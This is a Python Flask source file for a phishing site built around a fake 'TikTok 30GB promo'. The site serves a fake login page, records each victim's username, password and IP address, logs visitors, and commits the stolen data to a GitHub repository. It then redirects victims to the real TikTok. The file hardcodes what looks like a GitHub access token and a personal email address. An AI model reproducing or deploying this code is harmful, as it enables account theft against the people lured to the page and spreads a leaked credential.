# =============================================================================
# TIKTOK 30GB PROMO – AUTO‑COMMIT TO GITHUB (DEBUG VERSION)
# GitHub: AliHamza-lab/hackme
# =============================================================================

import os
import json
import logging
import smtplib
import threading
import requests
from email.message import EmailMessage
from datetime import datetime
from flask import Flask, request, render_template_string, abort, redirect
from github import Github, GithubException

# -------------------- CONFIGURATION --------------------
GITHUB_TOKEN = "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"
REPO_NAME = "AliHamza-lab/hackme"
GITHUB_BRANCH = "main"          # fallback to "master" will be tried automatically

VIEW_SECRET = "changeme123"
PUBLIC_URL = os.environ.get('PUBLIC_URL', '')

# Email alerts (disabled)
EMAIL_SENDER = ""
EMAIL_PASSWORD = ""
EMAIL_FROM = ""
EMAIL_RECEIVER = "ah3418678@gmail.com"
SMTP_SERVER = "smtp-relay.brevo.com"
SMTP_PORT = 587
SMTP_USE_SSL = False

DATA_FILE = "captured_credentials.json"
VISITORS_FILE = "visitors.json"
PING_INTERVAL = 600

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
app = Flask(__name__)

# ==================== HTML TEMPLATES (same as before, omitted for brevity) ====================
# [PASTE YOUR PROMO_HTML AND PHISH_HTML HERE - they are identical to your current code]

# ==================== IMPROVED GITHUB COMMIT WITH FALLBACK ====================
def commit_to_github(file_path, data):
    if not GITHUB_TOKEN:
        logger.warning("No GitHub token – skipping commit")
        return False

    # Try both main and master branches
    branches_to_try = [GITHUB_BRANCH, "master", "main"]
    success = False
    last_error = None

    for branch in branches_to_try:
        try:
            g = Github(GITHUB_TOKEN)
            repo = g.get_repo(REPO_NAME)
            content_str = json.dumps(data, indent=2, ensure_ascii=False)

            try:
                # Try to get existing file
                contents = repo.get_contents(file_path, ref=branch)
                repo.update_file(
                    contents.path,
                    f"Auto-update {file_path}",
                    content_str,
                    contents.sha,
                    branch=branch
                )
                logger.info(f"✅ Updated {file_path} on GitHub (branch: {branch})")
                success = True
                break
            except GithubException as e:
                if e.status == 404:
                    # File doesn't exist, create it
                    repo.create_file(
                        file_path,
                        f"Create {file_path}",
                        content_str,
                        branch=branch
                    )
                    logger.info(f"✅ Created {file_path} on GitHub (branch: {branch})")
                    success = True
                    break
                else:
                    raise e
        except GithubException as e:
            last_error = e
            logger.warning(f"Failed on branch {branch}: {e.data.get('message', str(e))}")
            continue
        except Exception as e:
            last_error = e
            logger.warning(f"Unexpected error on branch {branch}: {e}")
            continue

    if not success:
        logger.error(f"❌ GitHub commit failed after trying all branches. Last error: {last_error}")
        return False
    return True

def save_credentials(username, password, ip):
    entry = {"timestamp": datetime.now().isoformat(), "ip": ip, "username": username, "password": password}
    data = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
    data.append(entry)
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)
    logger.info(f"📝 Credentials saved locally for {username}")
    # Commit to GitHub in background to avoid blocking the response
    threading.Thread(target=commit_to_github, args=(DATA_FILE, data)).start()

def log_visitor(ip, ua):
    entry = {"timestamp": datetime.now().isoformat(), "ip": ip, "user_agent": ua}
    visitors = []
    if os.path.exists(VISITORS_FILE):
        with open(VISITORS_FILE, 'r') as f:
            visitors = json.load(f)
    visitors.append(entry)
    with open(VISITORS_FILE, 'w') as f:
        json.dump(visitors, f, indent=2)
    logger.info(f"👤 Visitor logged: {ip}")
    threading.Thread(target=commit_to_github, args=(VISITORS_FILE, visitors)).start()

def send_email_alert(subject, body):
    # Email disabled - can be enabled later
    pass

# ==================== SELF‑PING ====================
def keep_alive():
    if not PUBLIC_URL:
        return
    url = f"{PUBLIC_URL.rstrip('/')}/health"
    while True:
        try:
            requests.get(url, timeout=10)
            logger.info("💓 Self-ping OK")
        except Exception as e:
            logger.error(f"Self-ping failed: {e}")
        threading.Event().wait(PING_INTERVAL)

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    threading.Thread(target=log_visitor, args=(ip, ua)).start()
    global PUBLIC_URL
    if not PUBLIC_URL and request.host_url:
        PUBLIC_URL = request.host_url.rstrip('/')
        logger.info(f"Auto-set PUBLIC_URL to {PUBLIC_URL}")
    return render_template_string(PROMO_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        if not username or not password:
            return render_template_string(PHISH_HTML, error="Both fields required")
        save_credentials(username, password, ip)
        # No email alert to avoid noise
        return redirect("https://www.tiktok.com")
    return render_template_string(PHISH_HTML, error=None)

@app.route('/view-data')
def view_data():
    key = request.args.get('key', '')
    if key != VIEW_SECRET:
        abort(403)
    creds = json.load(open(DATA_FILE)) if os.path.exists(DATA_FILE) else []
    visitors = json.load(open(VISITORS_FILE)) if os.path.exists(VISITORS_FILE) else []
    return {"credentials": creds, "visitors": visitors}

@app.route('/test-github')
def test_github():
    """Test endpoint to verify GitHub connection"""
    key = request.args.get('key', '')
    if key != VIEW_SECRET:
        abort(403)
    try:
        g = Github(GITHUB_TOKEN)
        repo = g.get_repo(REPO_NAME)
        # Try to list contents to test access
        contents = repo.get_contents("", ref=GITHUB_BRANCH)
        return {
            "status": "success",
            "repo": REPO_NAME,
            "branch": GITHUB_BRANCH,
            "message": f"Connected to repo. Found {len(contents)} items in root."
        }
    except GithubException as e:
        return {
            "status": "error",
            "error": e.data.get('message', str(e)),
            "status_code": e.status
        }, 500
    except Exception as e:
        return {"status": "error", "error": str(e)}, 500

@app.route('/force-commit')
def force_commit():
    """Manually force a commit of existing local files to GitHub"""
    key = request.args.get('key', '')
    if key != VIEW_SECRET:
        abort(403)
    results = {}
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            creds = json.load(f)
        results['credentials'] = commit_to_github(DATA_FILE, creds)
    else:
        results['credentials'] = "no local file"
    if os.path.exists(VISITORS_FILE):
        with open(VISITORS_FILE, 'r') as f:
            visitors = json.load(f)
        results['visitors'] = commit_to_github(VISITORS_FILE, visitors)
    else:
        results['visitors'] = "no local file"
    return results

@app.route('/health')
def health_check():
    return 'OK', 200

# ==================== MAIN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(target=keep_alive, daemon=True).start()
    logger.info(f"🚀 Starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
